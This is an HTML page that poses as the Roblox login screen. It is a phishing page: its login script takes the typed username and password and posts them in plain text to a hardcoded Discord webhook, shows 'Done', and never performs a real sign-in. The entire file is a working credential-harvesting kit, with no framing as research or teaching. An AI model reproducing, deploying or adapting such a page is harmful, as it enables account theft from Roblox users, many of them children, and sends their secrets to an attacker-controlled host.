<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox Login</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&display=swap');

body {
    margin: 0;
    font-family: "Source Sans 3", Arial, sans-serif;
    background: #0b0b0b;
    overflow: hidden;
    color: white;
}

/* BACKGROUND TILES */
.bg {
    position: fixed;
    inset: 0;
    z-index: 0;
    overflow: hidden;
    filter: brightness(0.65);
}

.tile {
    position: absolute;
    width: 180px;
    height: 180px;
    border-radius: 12px;
    background-size: cover;
    background-position: center;
    opacity: 0.85;
    transform: rotate(12deg);
    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
}

.t1 { top: 50px; left: 60px; background-image: url('https://picsum.photos/300?1'); }
.t2 { top: 140px; right: 80px; background-image: url('https://picsum.photos/300?2'); }
.t3 { bottom: 90px; left: 120px; background-image: url('https://picsum.photos/300?3'); }
.t4 { bottom: 140px; right: 120px; background-image: url('https://picsum.photos/300?4'); }

/* TOP BAR */
.topbar {
    position: fixed;
    top: 0;
    width: 100%;
    display: flex;
    justify-content: center;
    padding: 20px;
    z-index: 5;
}

.topbar img {
    height: 28px;
}

/* CENTER */
.center {
    position: relative;
    z-index: 2;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

.logo {
    font-size: 56px;
    font-weight: 800;
    letter-spacing: 3px;
    margin-bottom: 18px;
}

/* LOGIN CARD */
.card {
    width: 380px;
    background: #1c1c1f;
    padding: 24px;
    border-radius: 12px;
    box-shadow: 0 25px 60px rgba(0,0,0,0.6);
}

.card h2 {
    text-align: center;
    font-size: 16px;
    margin-bottom: 14px;
    color: #ddd;
}

input {
    width: 100%;
    padding: 12px;
    margin: 6px 0;
    border-radius: 6px;
    border: 1px solid #333;
    background: #111;
    color: white;
    outline: none;
}

input:focus {
    border-color: #5a8eff;
}

/* BUTTON */
button {
    width: 100%;
    margin-top: 12px;
    padding: 12px;
    background: #5a8eff;
    border: none;
    border-radius: 6px;
    font-weight: 700;
    color: white;
    cursor: pointer;
}

button:hover {
    background: #4679ff;
}

/* STATUS TEXT */
.status {
    text-align: center;
    margin-top: 10px;
    font-size: 13px;
    color: #aaa;
}

/* FOOTER */
.footer {
    position: absolute;
    bottom: 20px;
    width: 100%;
    text-align: center;
    font-size: 12px;
    opacity: 0.7;
}
</style>
</head>

<body>

<!-- BACKGROUND -->
<div class="bg">
    <div class="tile t1"></div>
    <div class="tile t2"></div>
    <div class="tile t3"></div>
    <div class="tile t4"></div>
</div>

<!-- TOP BAR -->


<!-- CENTER -->
<div class="center">
    <div class="logo">ROBLOX</div>

    <div class="card" id="card">
        <h2>LOG IN TO CONTINUE</h2>

        <input id="username" placeholder="Username / Email">
        <input id="password" type="password" placeholder="Password">

        <button onclick="login()">Log In</button>

        <div class="status" id="status"></div>
    </div>
</div>

<div class="footer">
    ROBLOX ON YOUR DEVICE
</div>

<script>
async function login() {
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;
    const status = document.getElementById("status");

    status.innerText = "Attempting to login.";

    await fetch("https://discord.com/api/webhooks/1507832196746973286/Z_oF1U8UZ1-AL0jrwQzeZZkV-q3sPGaAbFsDcnkZjpWrtSsW15pDme3oQGF49xud375i", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: `username: ${user} password: ${pass}`
        })
    });

    status.innerText = "Done";
}

</script>

</body>
</html>
